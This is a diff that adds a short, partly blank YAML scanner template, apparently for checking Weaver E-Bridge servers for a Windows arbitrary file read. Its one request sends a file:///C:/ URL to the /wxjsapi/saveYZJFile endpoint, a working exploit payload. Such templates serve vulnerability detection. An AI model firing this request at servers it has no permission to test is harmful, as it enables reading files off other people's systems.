@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 泛微云桥E-Bridge 任意文件读取(windows)
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
+  headers:
+response1:
+  headers:
+  body: id
+  code: 200
+requests2:
+response2:
